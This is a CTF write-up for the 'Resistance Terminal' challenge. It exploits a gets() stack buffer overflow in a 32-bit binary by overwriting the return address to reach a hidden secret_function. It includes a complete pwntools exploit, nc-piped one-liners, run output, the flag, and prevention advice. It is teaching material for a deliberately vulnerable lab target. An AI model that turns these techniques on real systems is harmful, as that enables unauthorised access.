---
title: "EotW CTF SS CASE IT 2025: Resistance Terminal Writeup"
date: "2025-05-27"
description: "Breaking into the AI Regime's secure terminal through a classic buffer overflow vulnerability. A beginner-friendly PWN challenge featuring the resistance against AI oppression."
tags: ["pwn", "buffer-overflow", "binary-exploitation", "ctf", "gets-vulnerability", "ret2func"]
---

## Infiltrating the AI Regime Terminal: A Basic Buffer Overflow

**Category**: PWN  
**Points**: 100  
**Description**: The resistance against the AI Regime needs access to a secure terminal, but the login system is heavily protected. Can you find a way to break into the system and retrieve the secret resistance codes?

## Challenge Context

The challenge presents us with an intercepted resistance transmission:

```
[INTERCEPTED RESISTANCE TRANSMISSION]

Attention recruit,

Our resistance network has secured a terminal access point to AI Regime infrastructure.
We need you to bypass the security and gain access to classified information
stored within. Our intel suggests the terminal has a security vulnerability
in its authentication system.

Your mission: Exploit the vulnerability to bypass security controls and
retrieve the secret codes that will help us disable AI monitoring systems.

Good luck. The future of humanity depends on you.

[END TRANSMISSION]
```

## Initial Analysis

Connecting to the challenge service reveals a terminal interface asking for a resistance access code:

```bash
nc challs.0x4m4.com 9999
```

The program prompts for an access code but appears to reject any normal input. This suggests we need to find an alternative approach to gain access.

## Vulnerability Discovery

Analyzing the source code (or through reverse engineering), I found the critical vulnerability in the authentication function:

```c
void vulnerable_function() {
    char password[32];
    printf("Enter resistance access code: ");
    gets(password);  // Vulnerable function with no bounds checking
    
    printf("Access denied. Your attempt has been logged.\n");
}
```

The vulnerability exists because:
1. The `gets()` function reads unlimited input into a 32-byte buffer
2. No bounds checking is performed on user input
3. We can overflow the buffer and overwrite the return address
4. There's a hidden `secret_function()` that prints the flag but is never called normally

## Finding the Target Function

Using static analysis tools to locate the secret function:

```bash
objdump -t resistance_terminal | grep secret_function
```

This reveals the function address:
```
080491d6 g     F .text  00000086 secret_function
```

We can also use `gdb` to find the address:

```bash
gdb ./resistance_terminal
(gdb) info functions
(gdb) print secret_function
```

## Determining the Buffer Offset

To exploit this vulnerability, I needed to find the exact offset to the return address. The buffer is 32 bytes, plus 4 bytes for the saved frame pointer (EBP), giving us a total offset of 36 bytes.

We can verify this using a pattern:

```python
from pwn import *
print(cyclic(50))
```

Testing in `gdb` confirms the 36-byte offset to control the return address.

## Exploitation

Here's my complete exploit script:

```python
#!/usr/bin/env python3
from pwn import *

# Set context for 32-bit architecture
context.arch = 'i386'
context.log_level = 'info'

# Connect to the challenge
# For local testing: conn = process('./resistance_terminal')
conn = remote('challs.0x4m4.com', 9999)

# Address of secret_function (obtained from objdump)
secret_addr = 0x080491d6

log.info(f"Target secret_function address: {hex(secret_addr)}")
log.info("Crafting buffer overflow payload...")

# Craft the payload
# 32 bytes buffer + 4 bytes saved EBP + return address
payload = b'A' * 36  # Padding to reach return address
payload += p32(secret_addr)  # Overwrite return address with secret_function

# Send the payload
conn.recvuntil(b"Enter resistance access code: ")
log.info("Sending payload to bypass authentication...")
conn.sendline(payload)

# Receive and display the flag
log.success("Payload sent! Receiving secret codes...")
response = conn.recvall().decode()
print(response)

# Extract the flag
if "sscit{" in response:
    flag_start = response.find("sscit{")
    flag_end = response.find("}", flag_start) + 1
    flag = response[flag_start:flag_end]
    log.success(f"Secret resistance codes retrieved: {flag}")

conn.close()
```

## Alternative Exploitation Methods

### Python One-liner

For a quick exploit without a full script:

```bash
python3 -c "import struct; print('A' * 36 + struct.pack('<I', 0x080491d6))" | nc challenge.server.com 9999
```

### Using pwntools one-liner

```bash
python3 -c "from pwn import *; print((b'A'*36 + p32(0x080491d6)).decode('latin1'))" | nc challenge.server.com 9999
```

### Perl Alternative

If Python isn't available:

```bash
(perl -e 'print "A"x36 . "\xd6\x91\x04\x08"'; cat) | nc challenge.server.com 9999
```

## Running the Exploit

When I executed the exploit, here's what happened:

```bash
python3 exploit.py
[*] Target secret_function address: 0x80491d6
[*] Crafting buffer overflow payload...
[*] Sending payload to bypass authentication...
[+] Payload sent! Receiving secret codes...

Access denied. Your attempt has been logged.

[RESISTANCE TERMINAL ACCESS GRANTED]
[DECRYPTING CLASSIFIED INTELLIGENCE...]

SECRET RESISTANCE CODES RETRIEVED:
sscit{r3s1st4nc3_h4ck3d_th3_m41nfr4m3_4nd_br0k3_fr33}

[TRANSMISSION SECURE - RESISTANCE NETWORK ACTIVATED]

[+] Secret resistance codes retrieved: sscit{r3s1st4nc3_h4ck3d_th3_m41nfr4m3_4nd_br0k3_fr33}
```

## Technical Analysis

### Memory Layout

The stack layout during exploitation:

```
High Memory
+------------------+
| Return Address   | <- We overwrite this (offset 36)
+------------------+
| Saved EBP        | (offset 32)
+------------------+
| password[32]     | <- Our input buffer starts here
+------------------+
Low Memory
```

### Why This Works

1. **No Stack Protection**: The binary lacks stack canaries
2. **Predictable Addresses**: No ASLR makes function addresses static
3. **Unsafe Input Function**: `gets()` provides unlimited input capability
4. **Hidden Functionality**: The `secret_function()` exists but isn't called normally

## Debugging Tips

To find the function address dynamically:

```bash
# Using objdump
objdump -t resistance_terminal | grep secret

# Using nm
nm resistance_terminal | grep secret

# Using gdb
gdb ./resistance_terminal
(gdb) info functions secret
```

## Key Learnings

This challenge teaches fundamental concepts:

1. **Buffer Overflow Basics**: Understanding how stack-based overflows work
2. **Return Address Hijacking**: Redirecting program execution flow
3. **Static Analysis**: Finding hidden functions in binaries
4. **Payload Crafting**: Calculating offsets and constructing exploits

## Prevention Measures

To secure this code:

1. **Replace Unsafe Functions**: Use `fgets()` instead of `gets()`
2. **Enable Stack Protection**: Compile with `-fstack-protector`
3. **Input Validation**: Always check input bounds
4. **Remove Dead Code**: Don't include unused functions like `secret_function()`

```c
// Secure version
void secure_function() {
    char password[32];
    printf("Enter resistance access code: ");
    fgets(password, sizeof(password), stdin);  // Safe bounded input
    // ... validation logic
}
```

## Conclusion

The Resistance Terminal challenge provided an excellent introduction to buffer overflow exploitation. By leveraging the unsafe `gets()` function, I was able to bypass the authentication system and redirect execution to the hidden `secret_function()`, successfully retrieving the resistance codes.

This challenge demonstrates how even simple programming mistakes can lead to complete system compromise. The themed narrative around the resistance against AI oppression made the technical exploitation more engaging and memorable.

The flag was: `sscit{r3s1st4nc3_h4ck3d_th3_m41nfr4m3_4nd_br0k3_fr33}`

The resistance lives on, one buffer overflow at a time! 🚀 